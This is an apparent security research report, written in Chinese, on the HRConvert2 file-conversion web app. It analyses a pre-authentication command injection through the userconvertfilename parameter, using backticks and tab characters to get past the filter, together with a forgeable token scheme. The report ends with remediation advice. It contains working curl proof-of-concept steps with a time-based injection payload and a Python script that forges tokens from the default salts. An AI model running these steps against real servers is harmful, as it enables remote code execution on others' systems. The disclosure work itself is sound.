# HRConvert2 漏洞分析报告（前认证RCE / 认证绕过后RCE）

分析日期：2026-04-08  
目标项目：`d:\破壳项目\112_zelon88_HRConvert2`  
参考资料：`./漏洞信息/2041455675347034114.pdf`、`./漏洞信息/2041455794591096833.pdf`（已提取文本并交叉源码核验）

## 1. 结论概览

- 结论1（已确认）：存在**前认证命令注入导致RCE**，可通过 `convertCore.php` 的文件上传+转换链路触发。
- 结论2（已确认）：存在**令牌校验绕过（认证/授权门禁绕过）**，绕过后可直接进入上述RCE链路，形成“认证绕过后RCE”。
- 默认配置下可触发：**是**。

## 2. 默认部署与攻击面锁定

### 2.1 默认就是无认证入口

`Resources/config.php` 明确写明无认证场景：

```php
// Resources/config.php
// 11-13
// This application is designed to provide a web-interface for converting file formats
// on a server for users of any web browser without authentication.
```

默认入口直达 `convertCore.php`：

```html
<!-- index.html:12-14 -->
if (screen.width <= 699) { document.location = "/HRProprietary/HRConvert2/convertCore.php"; }
if (screen.width >= 700) { document.location = "/HRProprietary/HRConvert2/convertCore.php"; }
```

### 2.2 默认配置下高危执行面开启

`Resources/config.php:242` 默认启用 `Audio/Video/Image/Archive/OCR` 等转换类型，`convertCore.php` 内大量 `shell_exec()` sink 可达（如 `convertAudio()`、`convertImages()`、`convertDocuments()`、`convertArchives()`、`ocrFiles()`、`userClamScan()`、`startScanCore()`）。

## 3. 漏洞一：前认证RCE（命令注入）

### 3.1 利用链（具体函数/代码段）

#### Step A：前认证可上传文件

```php
// convertCore.php:2182-2187
if ($TokensAreValid) {
  if ($TokensAreValid && !empty($_FILES)) {
    list ($UploadComplete, $UploadErrors) = uploadFiles();
```

```php
// convertCore.php:1337-1356 (uploadFiles)
if (!is_array($_FILES['file']['name'])) $_FILES['file']['name'] = array($_FILES['file']['name']);
foreach ($_FILES['file']['name'] as $file) {
  list ($file, $variableIsSanitized) = sanitize($file, TRUE);
  ...
  @copy($_FILES['file']['tmp_name'], $f1);
}
```

#### Step B：可控参数进入转换链路

```php
// convertCore.php:292,294 (verifyInputs)
if (isset($_POST['userconvertfilename'])) list ($UserFilename, ...) = sanitize($_POST['userconvertfilename'], TRUE);
if (isset($_POST['convertSelected'])) list ($ConvertSelected, ...) = sanitize($_POST['convertSelected'], TRUE);
```

```php
// convertCore.php:2216-2218
if (isset($_POST['convertSelected'])) {
  list ($ConversionComplete, $ConversionErrors) = convertFiles($ConvertSelected, $UserFilename, $UserExtension, $Height, $Width, $Rotate, $Bitrate);
}
```

#### Step C：路径/输出名拼接后进入 shell_exec sink

```php
// convertCore.php:1262 (verifyFile)
list ($NewPathname, $variableIsSanitized) = sanitize($ConvertDir.$UserFilename.'.'.$UserExtension, FALSE);
```

```php
// convertCore.php:1044 (convertAudio)
$returnData = shell_exec('ffmpeg -y -i '.$pathname.$ext.$br.$newPathname);
```

同类 sink 还包括：
- `convertDocuments()`：`convertCore.php:819`
- `convertImages()`：`convertCore.php:856`
- `convertModels()`：`convertCore.php:886`
- `convertDrawings()`：`convertCore.php:916`
- `convertVideos()`：`convertCore.php:946`
- `convertSubtitles()`：`convertCore.php:976`
- `convertStreams()`：`convertCore.php:1006`
- `convertArchives()`：`convertCore.php:1091-1168`
- `ocrFiles()`：`convertCore.php:1668,1678,1700,1712,1730,1741,1744,1758`

### 3.2 过滤与绕过分析

核心过滤函数：

```php
// convertCore.php:67-69 (sanitizeString)
if ($strict) $Variable = htmlentities(trim(str_replace(' ', '_', str_replace('..', '', str_replace('//', '', str_replace(str_split('|\\~#[](){};:$!#^&%@>*<"\'/'), '', $Variable))))), ENT_QUOTES, 'UTF-8');
if (!$strict) $Variable = htmlentities(trim(str_replace(' ', '_', str_replace('..', '', str_replace('//', '', str_replace(str_split('|\\[](){};"\''), '', $Variable))))), ENT_QUOTES, 'UTF-8');
```

结论：
- 过滤了很多符号，但**没有过滤反引号 \`**。
- 只替换了普通空格 `' '`，**没有处理 Tab/Newline**（`\t` / `\n`）。
- sink 构造命令时**未使用 `escapeshellarg()`**，全部是字符串拼接。

因此可通过 **反引号命令替换 + Tab 分隔参数** 实现绕过，例如：
- `userconvertfilename=out\`touch<TAB>pwned\``

命令执行点会在 shell 解析阶段先执行反引号内命令，随后再执行 `ffmpeg/...` 主命令。

### 3.3 默认配置下可触发性

- 前提满足：
  - 无认证入口（`Resources/config.php:12`）
  - 转换功能默认开启（`Resources/config.php:242`）
  - 执行链默认走到 `shell_exec` sink
- 依赖条件：
  - 对应转换命令存在（项目默认依赖声明包含 FFMPEG/Unoconv/ImageMagick 等，`Resources/config.php:26-28`）

结论：默认部署语义下，该链路可触发。

### 3.4 详细 PoC（授权测试）

以下 PoC 仅用于授权测试。示例目标：`http://127.0.0.1:8080/HRProprietary/HRConvert2/convertCore.php`。

#### PoC-A：从真实页面获取 token 后触发 time-based RCE

1) 准备文件：

```bash
TARGET="http://127.0.0.1:8080/HRProprietary/HRConvert2/convertCore.php"
printf 'ID3' > sample.mp3
```

2) 先 GET 页面，提取隐藏域中的 `Token1/Token2`：

```bash
PAGE="$(curl -s "$TARGET")"
TOKEN1="$(printf '%s' "$PAGE" | sed -n "s/.*name='Token1' value='\([^']*\)'.*/\1/p" | head -n1)"
TOKEN2="$(printf '%s' "$PAGE" | sed -n "s/.*name='Token2' value='\([^']*\)'.*/\1/p" | head -n1)"
```

3) 上传可转换文件：

```bash
curl -sS -X POST "$TARGET" \
  -F "Token1=$TOKEN1" \
  -F "Token2=$TOKEN2" \
  -F "file=@sample.mp3;filename=sample.mp3" >/dev/null
```

4) 发送基线转换请求（无注入）：

```bash
time curl -sS -X POST "$TARGET" \
  --data-urlencode "Token1=$TOKEN1" \
  --data-urlencode "Token2=$TOKEN2" \
  --data-urlencode "convertSelected=sample.mp3" \
  --data-urlencode "extension=mp3" \
  --data-urlencode "userconvertfilename=baseline_out" >/dev/null
```

5) 发送注入请求（反引号 + Tab 分隔参数）：

```bash
time curl -sS -X POST "$TARGET" \
  --data-urlencode "Token1=$TOKEN1" \
  --data-urlencode "Token2=$TOKEN2" \
  --data-urlencode "convertSelected=sample.mp3" \
  --data-urlencode "extension=mp3" \
  --data-urlencode $'userconvertfilename=poc`sleep\t8`' >/dev/null
```

预期结果：第 5 步比第 4 步多约 8 秒延迟，可作为 blind RCE 证据。对应调用链：`convertCore.php:2216 -> 1539 -> 1580 -> 1598 -> 1044(shell_exec)`。

#### PoC-B：默认盐值未修改时的离线伪造 token 变体

```bash
python3 - <<'PY'
import hashlib

token1 = "A" * 20
salts = [
    "something1SoRa21nDoMThatNobody_4Wiljl_evar+guess+i1tgdgdfgfdsfgdasfdas",
    "gdf4sgdfsg1sdfsomethingSoRa33nDoMThatNobody_Will2_evar_guess+it",
    "somethingSoRanDoMThatNobo423432dy54534534_Will_evar+guess+it",
    "somethin1gSoRanDoMThat123:l_will_evar-guess+it",
    "somethingSoRanDoMThatNobodyr3454r3r33_Will_evar+guess+it",
    "somethingSoR5anDoMThatNob2odyawryoglukfgy;/,6^&__Will_evar+guess+it",
]
token2 = hashlib.new("ripemd160", (token1 + "".join(salts)).encode()).hexdigest()
print(token1)
print(token2)
PY
```

拿到这组 token 后，重复 PoC-A 的第 3~5 步（可跳过页面取 token）。若依然可触发延迟，说明 token 机制可被计算复现（在默认盐值未改前提下）。

#### PoC-C：反证“缺失 Token2 直接绕过”并不成立

```bash
curl -sS -X POST "$TARGET" \
  -F "Token1=$TOKEN1" \
  -F "file=@sample.mp3;filename=no_token2.mp3" >/dev/null

curl -sS -X POST "$TARGET" \
  --data-urlencode "Token1=$TOKEN1" \
  --data-urlencode "Token2=$TOKEN2" \
  --data-urlencode "convertSelected=no_token2.mp3" \
  --data-urlencode "extension=mp3" \
  --data-urlencode "userconvertfilename=check_no_token2"
```

预期结果：第一步上传不会成功，第二步转换失败；与 `verifyInputs()` + `verifyTokens()` 逻辑一致。

## 4. 漏洞二：弱令牌机制（可获取/可伪造 Token）并可串联 RCE

### 4.1 问题点（具体函数/代码段）

匿名页面直接下发令牌：

```php
// UI/Default/convertGui1.php:180-181
<input type='hidden' name='Token1' value='...'>
<input type='hidden' name='Token2' value='...'>
```

令牌校验逻辑仅做“参数一致性”而非“身份认证”：

```php
// convertCore.php:249-257 (verifyTokens)
function verifyTokens($Token1, $Token2) {
  $TokensAreValid = TRUE;
  if (!isset($Token1) or $Token1 === '' or strlen($Token1) < 19) $Token1 = hash(...);
  if (isset($Token2)) if ($Token2 !== hash(...)) $TokensAreValid = FALSE;
  if (!isset($Token2) or $Token2 === '' or strlen($Token2) < 19) $Token2 = hash(...);
  return array($TokensAreValid, $Token1, $Token2);
}
```

核心风险：
- 攻击者可匿名 GET 页面拿到合法 token，不构成真实认证边界。
- 若部署未修改默认盐值，`Token2 = ripemd160(Token1 + Salts1..6)` 可离线计算（`Resources/config.php:42-47`）。
- 拿到合法/伪造 token 后，可直接进入 `if ($TokensAreValid)` 的上传和转换路径。

### 4.2 与 RCE 链路拼接

- 路径一：匿名 GET 页面获取 token -> 上传文件 -> 触发 `convertFiles -> shell_exec`。
- 路径二：默认盐值未改时离线伪造 token -> 上传文件 -> 触发 `convertFiles -> shell_exec`。
- 对应可复核步骤见本报告 `3.4` 的 PoC-A / PoC-B。

### 4.3 旁路问题（加重风险）

`SesHash2` 在 `verifySesHash()` 中基于 `Token1` 计算（`convertCore.php:164`），执行顺序是先 `verifySesHash`（`2122`）后 `verifyTokens`（`2155`）。
这使“可控 Token1”提前参与会话目录计算，进一步削弱令牌门禁意义。

## 5. 过滤是否存在、是否可绕过、默认配置能否触发（汇总）

- 存在过滤：`sanitizeString()/sanitize()` 对部分字符做删除与替换。
- 过滤可绕过：可以，通过 **反引号 + Tab/Newline**；且 sink 未做 shell 参数安全封装。
- 默认配置下能触发：可以（无认证入口 + 默认开启转换类型 + 可达 shell_exec）。

## 6. 与 `./漏洞信息` 报告的关系

- 两份 PDF 主要是“文件上传相关函数/语句”批量命中，存在重复与噪声。
- 本次结论以“源码可达性 + 函数级调用链 + 默认配置门禁验证”为准，已确认可形成真实 exploit chain，而非仅语句命中。

## 7. 风险评级

- 漏洞一（前认证RCE）：**严重（Critical）**
- 漏洞二（认证/授权绕过）：**高危（High）**
- 组合链（认证绕过后RCE）：**严重（Critical）**

## 8. 修复建议（最小闭环）

- 所有 `shell_exec` 参数一律改为 `escapeshellarg()`，并避免字符串拼接命令。
- 在过滤层补齐：反引号、控制字符（`\t \n \r`）等；同时不要把“黑名单替换”当作命令安全边界。
- 重做令牌校验：缺失 Token 必须失败；并将令牌与真实服务端会话绑定（不可仅凭请求参数）。
- 为敏感操作引入明确鉴权（至少强认证+CSRF 防护），而非“可选 token”。
- 对 `userconvertfilename/extension/rotate/bitrate/filesToScan` 等参数引入严格白名单（格式/长度/字符集）。






